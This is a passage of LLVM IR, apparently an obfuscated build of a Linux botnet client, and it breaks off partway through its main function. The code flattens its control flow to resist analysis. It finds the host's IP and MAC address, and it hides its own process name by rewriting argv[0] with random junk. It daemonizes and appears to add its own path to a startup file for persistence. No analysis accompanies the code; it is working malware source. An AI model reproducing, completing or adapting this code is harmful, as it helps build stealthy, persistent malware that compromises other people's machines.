  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 714850517, label %first
    i32 -188308311, label %18
    i32 -1300154914, label %19
    i32 -1425322271, label %36
    i32 -133064895, label %37
    i32 1226038564, label %47
    i32 1557637834, label %48
    i32 -713176956, label %53
    i32 -127872212, label %59
    i32 1564184919, label %64
    i32 -1834176471, label %66
    i32 1432538913, label %72
    i32 -1975990881, label %75
    i32 -1367490698, label %77
    i32 -1981976115, label %79
    i32 711645778, label %86
    i32 1979955154, label %94
    i32 1810034959, label %98
    i32 -870294858, label %110
    i32 -783927366, label %113
    i32 828249266, label %114
    i32 925760359, label %117
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %16 = icmp eq i32 %.reload, -1
  %17 = select i1 %16, i32 -188308311, i32 -1300154914
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 925760359, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 16, i32 4, i1 false)
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %21, align 4
  %22 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.474, i32 0, i32 0)) #2
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %24 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %23, i32 0, i32 0
  store i32 %22, i32* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 53) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i32, i32* %2, align 4
  %28 = bitcast %union.__CONST_SOCKADDR_ARG* %5 to %struct.sockaddr**
  %29 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %29, %struct.sockaddr** %28, align 8
  %30 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %5, i32 0, i32 0
  %31 = load %struct.sockaddr*, %struct.sockaddr** %30, align 8
  %32 = call i32 @connect(i32 %27, %struct.sockaddr* %31, i32 16)
  store i32 %32, i32* %4, align 4
  %33 = load i32, i32* %4, align 4
  %34 = icmp eq i32 %33, -1
  %35 = select i1 %34, i32 -1425322271, i32 -133064895
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 925760359, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 16, i32* %7, align 4
  %38 = load i32, i32* %2, align 4
  %39 = bitcast %union.__CONST_SOCKADDR_ARG* %8 to %struct.sockaddr**
  %40 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  store %struct.sockaddr* %40, %struct.sockaddr** %39, align 8
  %41 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %8, i32 0, i32 0
  %42 = load %struct.sockaddr*, %struct.sockaddr** %41, align 8
  %43 = call i32 @getsockname(i32 %38, %struct.sockaddr* %42, i32* %7) #2
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, -1
  %46 = select i1 %45, i32 1226038564, i32 1557637834
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 925760359, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %50 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %49, i32 0, i32 0
  %51 = load i32, i32* %50, align 4
  store i32 %51, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %52 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.475, i32 0, i32 0), i32 0)
  store i32 %52, i32* %9, align 4
  store i32 -713176956, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %55 = load i32, i32* %9, align 4
  %56 = call i8* @fdgets(i8* %54, i32 4096, i32 %55)
  %57 = icmp ne i8* %56, null
  %58 = select i1 %57, i32 -127872212, i32 -1981976115
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %61 = call i8* @strstr(i8* %60, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.476, i32 0, i32 0)) #10
  %62 = icmp ne i8* %61, null
  %63 = select i1 %62, i32 1564184919, i32 -1367490698
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %65, i8** %11, align 8
  store i32 -1834176471, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %11, align 8
  %68 = load i8, i8* %67, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp ne i32 %69, 9
  %71 = select i1 %70, i32 1432538913, i32 -1975990881
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i8*, i8** %11, align 8
  %74 = getelementptr inbounds i8, i8* %73, i32 1
  store i8* %74, i8** %11, align 8
  store i32 -1834176471, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i8*, i8** %11, align 8
  store i8 0, i8* %76, align 1
  store i32 -1981976115, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %78, i8 0, i64 4096, i32 16, i1 false)
  store i32 -713176956, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %9, align 4
  %81 = call i32 @close(i32 %80)
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %83 = load i8, i8* %82, align 16
  %84 = icmp ne i8 %83, 0
  %85 = select i1 %84, i32 711645778, i32 828249266
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %13, i32 0, i32 0
  %88 = bitcast %union.anon.7* %87 to [16 x i8]*
  %89 = getelementptr inbounds [16 x i8], [16 x i8]* %88, i32 0, i32 0
  %90 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %91 = call i8* @strcpy(i8* %89, i8* %90) #2
  %92 = load i32, i32* %2, align 4
  %93 = call i32 (i32, i64, ...) @ioctl(i32 %92, i64 35111, %struct.ifreq* %13) #2
  store i32 0, i32* %12, align 4
  store i32 1979955154, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %12, align 4
  %96 = icmp slt i32 %95, 6
  %97 = select i1 %96, i32 1810034959, i32 -783927366
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %13, i32 0, i32 1
  %100 = bitcast %union.anon.8* %99 to %struct.sockaddr*
  %101 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %100, i32 0, i32 1
  %102 = getelementptr inbounds [14 x i8], [14 x i8]* %101, i32 0, i32 0
  %103 = load i32, i32* %12, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %102, i64 %104
  %106 = load i8, i8* %105, align 1
  %107 = load i32, i32* %12, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %108
  store i8 %106, i8* %109, align 1
  store i32 -870294858, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %12, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %12, align 4
  store i32 1979955154, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 828249266, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %2, align 4
  %116 = call i32 @close(i32 %115)
  store i32 925760359, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %1, align 4
  ret i32 %118

loopEnd:                                          ; preds = %114, %113, %110, %98, %94, %86, %79, %77, %75, %72, %66, %64, %59, %53, %48, %47, %37, %36, %19, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.477, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @makeFukdString(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = call i64 @time(i64* null) #2
  %7 = trunc i64 %6 to i32
  call void @srand(i32 %7) #2
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -1073982630, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1073982630, label %8
    i32 -1352871049, label %13
    i32 -298317743, label %22
    i32 911745949, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %5, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %9, %10
  %12 = select i1 %11, i32 -1352871049, i32 911745949
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = call i32 @rand() #2
  %15 = srem i32 %14, 223
  %16 = add nsw i32 %15, 33
  %17 = trunc i32 %16 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  store i32 -298317743, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %5, align 4
  %24 = add nsw i32 %23, 1
  store i32 %24, i32* %5, align 4
  store i32 -1073982630, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %22, %13, %8, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @touchMyself(i8**) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8**, align 8
  store i8** %0, i8*** %2, align 8
  %3 = call i32 @fork() #2
  store i32 %3, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1895627169, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1895627169, label %first
    i32 1499339534, label %6
    i32 1248115860, label %7
    i32 -435305100, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %4 = icmp ne i32 %.reload, 0
  %5 = select i1 %4, i32 -435305100, i32 1499339534
  store i32 %5, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  store i32 1248115860, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8**, i8*** %2, align 8
  %9 = getelementptr inbounds i8*, i8** %8, i64 0
  %10 = load i8*, i8** %9, align 8
  %11 = call i32 @rand() #2
  %12 = srem i32 %11, 128
  %13 = add nsw i32 1024, %12
  call void @makeFukdString(i8* %10, i32 %13)
  %14 = call i32 @sleep(i32 3)
  store i32 1248115860, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %7, %6, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [256 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca %struct._IO_FILE*, align 8
  %16 = alloca [256 x i8], align 16
  %17 = alloca [1024 x i8], align 16
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct._IO_FILE*, align 8
  %21 = alloca [4096 x i8], align 16
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca [1024 x i8], align 16
  %31 = alloca i32, align 4
  %32 = alloca [10 x i8*], align 16
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.478, i32 0, i32 0))
  %37 = call i32 @getpid() #2
  store i32 %37, i32* @actualparent, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %38 = call i32 @fork() #2
  store i32 %38, i32* %6, align 4
  %39 = load i32, i32* %6, align 4
  store i32 %39, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1815565831, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i1
  %.reg2mem6 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1815565831, label %first
    i32 -100145245, label %42
    i32 -781573867, label %43
    i32 144131047, label %47
    i32 258761057, label %48
    i32 -651342182, label %54
    i32 308138221, label %55
    i32 313383204, label %86
    i32 1227916845, label %89
    i32 1027478628, label %93
    i32 -1326385006, label %105
    i32 1071393978, label %106
    i32 -1566178000, label %117
    i32 2111013468, label %120
    i32 2302454, label %130
    i32 1763618025, label %136
    i32 528600659, label %145
    i32 -418609749, label %148
    i32 2088774709, label %149
    i32 -1196533208, label %153
    i32 237567033, label %161
    i32 719898845, label %167
    i32 878692148, label %168
    i32 -790403174, label %171
    i32 414781161, label %172
    i32 -1648053169, label %175
    i32 -158975837, label %176
    i32 1044765401, label %181
    i32 -227390403, label %184
    i32 -27894714, label %188
    i32 780268429, label %192
    i32 -105178262, label %193
    i32 -2087069078, label %197
    i32 -1124217176, label %198
    i32 901540034, label %200
    i32 900303546, label %201
    i32 2032595975, label %202
    i32 1969084500, label %204
    i32 -2076822319, label %205
    i32 822101144, label %209
    i32 490192342, label %213
    i32 1833118697, label %215
    i32 2012051506, label %221
    i32 69673568, label %227
    i32 1586391864, label %228
    i32 -466850854, label %233
    i32 718649162, label %242
    i32 -2114589392, label %245
    i32 -1858349822, label %250
    i32 834333604, label %261
    i32 -859482085, label %264
    i32 698160158, label %278
    i32 -1852825005, label %283
    i32 1563883132, label %293
    i32 -704132885, label %296
    i32 -1281560177, label %300
    i32 638698288, label %301
    i32 637080031, label %304
    i32 1513731826, label %314
    i32 -837822496, label %317
    i32 -1487161328, label %323
    i32 -1416069226, label %330
    i32 -728518522, label %331
    i32 -1043729879, label %332
    i32 -1073779449, label %339
    i32 -1916413737, label %342
    i32 1707440759, label %348
    i32 -836883135, label %353
    i32 1771480350, label %355
    i32 -891551943, label %358
    i32 412015130, label %364
    i32 -1207514106, label %365
    i32 1756024414, label %374
    i32 1707603004, label %384
    i32 2091930468, label %393
    i32 863508377, label %395
    i32 -419770031, label %401
    i32 500159947, label %403
    i32 1034316699, label %409
    i32 -1782147675, label %414
    i32 950940417, label %416
    i32 -1042222462, label %419
    i32 -653008128, label %424
    i32 -1077025599, label %429
    i32 1913659419, label %438
    i32 -1080709211, label %443
    i32 1413391110, label %447
    i32 717790711, label %448
    i32 699062616, label %455
    i32 1596357713, label %461
    i32 -1157199939, label %468
    i32 -412636856, label %471
    i32 -999504094, label %476
    i32 650460973, label %480
    i32 -152965341, label %486
    i32 -1522795545, label %509
    i32 1850112272, label %511
    i32 -68219443, label %517
    i32 -1553724777, label %518
    i32 -1020958373, label %523
    i32 399782352, label %528
    i32 131107019, label %531
    i32 -103106470, label %532
    i32 -1280718948, label %533
    i32 -141205426, label %534
    i32 -385905401, label %535
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %40 = icmp slt i32 %.reload, 0
  %41 = select i1 %40, i32 -100145245, i32 -781573867
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  call void @exit(i32 1) #14
  unreachable

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %6, align 4
  %45 = icmp sgt i32 %44, 0
  %46 = select i1 %45, i32 144131047, i32 258761057
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:48:                                     ; preds = %loopEntry
  %49 = call i32 (i32, ...) bitcast (i32 (...)* @umask to i32 (i32, ...)*)(i32 0)
  %50 = call i32 @setsid() #2
  store i32 %50, i32* %7, align 4
  %51 = load i32, i32* %7, align 4
  %52 = icmp slt i32 %51, 0
  %53 = select i1 %52, i32 -651342182, i32 308138221
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  call void @exit(i32 1) #14
  unreachable

; <label>:55:                                     ; preds = %loopEntry
  %56 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #2
  %57 = call i32 @close(i32 0)
  %58 = call i32 @close(i32 1)
  %59 = call i32 @close(i32 2)
  %60 = bitcast i8*** %5 to i8**
  call void @touchMyself(i8** %60)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %8, align 8
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i8**, i8*** %5, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 0
  %66 = load i8*, i8** %65, align 8
  %67 = call i64 @strlen(i8* %66) #10
  %68 = call i8* @strncpy(i8* %63, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i64 %67) #2
  %69 = load i8**, i8*** %5, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %70, align 8
  %71 = call i64 @time(i64* null) #2
  %72 = call i32 @getpid() #2
  %73 = sext i32 %72 to i64
  %74 = xor i64 %71, %73
  %75 = trunc i64 %74 to i32
  call void @srand(i32 %75) #2
  %76 = call i64 @time(i64* null) #2
  %77 = call i32 @getpid() #2
  %78 = sext i32 %77 to i64
  %79 = xor i64 %76, %78
  %80 = trunc i64 %79 to i32
  call void @init_rand(i32 %80)
  store i32 0, i32* %12, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.480, i32 0, i32 0), i8** %14, align 8
  %81 = load i8*, i8** %14, align 8
  %82 = call %struct._IO_FILE* @fopen(i8* %81, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store %struct._IO_FILE* %82, %struct._IO_FILE** %15, align 8
  %83 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %84 = icmp eq %struct._IO_FILE* %83, null
  %85 = select i1 %84, i32 313383204, i32 1227916845
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.481, i32 0, i32 0), i8** %14, align 8
  %87 = load i8*, i8** %14, align 8
  %88 = call %struct._IO_FILE* @fopen(i8* %87, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store %struct._IO_FILE* %88, %struct._IO_FILE** %15, align 8
  store i32 1227916845, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %91 = icmp ne %struct._IO_FILE* %90, null
  %92 = select i1 %91, i32 1027478628, i32 -158975837
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %5, align 8
  %95 = getelementptr inbounds i8*, i8** %94, i64 0
  %96 = load i8*, i8** %95, align 8
  %97 = call i64 @strlen(i8* %96) #10
  %98 = trunc i64 %97 to i32
  store i32 %98, i32* %18, align 4
  store i32 0, i32* %19, align 4
  %99 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i32 0, i32 0
  %100 = call i8* @getcwd(i8* %99, i64 256) #2
  %101 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i32 0, i32 0
  %102 = call i32 @strcmp(i8* %101, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #10
  %103 = icmp ne i32 %102, 0
  %104 = select i1 %103, i32 -1326385006, i32 414781161
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 1071393978, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i8**, i8*** %5, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 0
  %109 = load i8*, i8** %108, align 8
  %110 = load i32, i32* %18, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8, i8* %109, i64 %111
  %113 = load i8, i8* %112, align 1
  %114 = sext i8 %113 to i32
  %115 = icmp ne i32 %114, 47
  %116 = select i1 %115, i32 -1566178000, i32 2111013468
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %18, align 4
  %119 = add nsw i32 %118, -1
  store i32 %119, i32* %18, align 4
  store i32 1071393978, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i32 0, i32 0
  %122 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i32 0, i32 0
  %123 = load i8**, i8*** %5, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 0
  %125 = load i8*, i8** %124, align 8
  %126 = load i32, i32* %18, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8, i8* %125, i64 %127
  %129 = call i32 (i8*, i8*, ...) @sprintf(i8* %121, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.482, i32 0, i32 0), i8* %122, i8* %128) #2
  store i32 2302454, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %132 = call i32 @feof(%struct._IO_FILE* %131) #2
  %133 = icmp ne i32 %132, 0
  %134 = xor i1 %133, true
  %135 = select i1 %134, i32 1763618025, i32 2088774709
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = getelementptr inbounds [1024 x i8], [1024 x i8]* %17, i32 0, i32 0
  %138 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %139 = call i8* @fgets(i8* %137, i32 1024, %struct._IO_FILE* %138)
  %140 = getelementptr inbounds [1024 x i8], [1024 x i8]* %17, i32 0, i32 0
  %141 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i32 0, i32 0
  %142 = call i32 @strcasecmp(i8* %140, i8* %141) #10
  %143 = icmp ne i32 %142, 0
  %144 = select i1 %143, i32 -418609749, i32 528600659
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i32, i32* %19, align 4
  %147 = add nsw i32 %146, 1
  store i32 %147, i32* %19, align 4
  store i32 -418609749, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  store i32 2302454, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %19, align 4
  %151 = icmp eq i32 %150, 0
  %152 = select i1 %151, i32 -1196533208, i32 878692148
  store i32 %152, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %155 = call i32 @fclose(%struct._IO_FILE* %154)
  %156 = load i8*, i8** %14, align 8
  %157 = call %struct._IO_FILE* @fopen(i8* %156, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.483, i32 0, i32 0))
  store %struct._IO_FILE* %157, %struct._IO_FILE** %20, align 8
  %158 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %159 = icmp ne %struct._IO_FILE* %158, null
  %160 = select i1 %159, i32 237567033, i32 719898845
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i32 0, i32 0
  %163 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %164 = call i32 @fputs(i8* %162, %struct._IO_FILE* %163)
  %165 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %166 = call i32 @fclose(%struct._IO_FILE* %165)
  store i32 719898845, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  store i32 -790403174, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %170 = call i32 @fclose(%struct._IO_FILE* %169)
  store i32 -790403174, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  store i32 -1648053169, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %174 = call i32 @fclose(%struct._IO_FILE* %173)
  store i32 -1648053169, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -158975837, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = call i32 @getOurIP()
  %178 = call i32 @fork() #2
  store i32 %178, i32* %9, align 4
  %179 = icmp ne i32 %178, 0
  %180 = select i1 %179, i32 1044765401, i32 -227390403
  store i32 %180, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i32, i32* %9, align 4
  %183 = call i32 @waitpid(i32 %182, i32* %11, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %9, align 4
  %186 = icmp ne i32 %185, 0
  %187 = select i1 %186, i32 2032595975, i32 -27894714
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = call i32 @fork() #2
  store i32 %189, i32* %10, align 4
  %190 = icmp ne i32 %189, 0
  %191 = select i1 %190, i32 780268429, i32 -105178262
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i32, i32* %10, align 4
  %195 = icmp ne i32 %194, 0
  %196 = select i1 %195, i32 -1124217176, i32 -2087069078
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  store i32 901540034, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.484, i32 0, i32 0))
  store i32 901540034, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  store i32 900303546, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  store i32 1969084500, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %203 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.484, i32 0, i32 0))
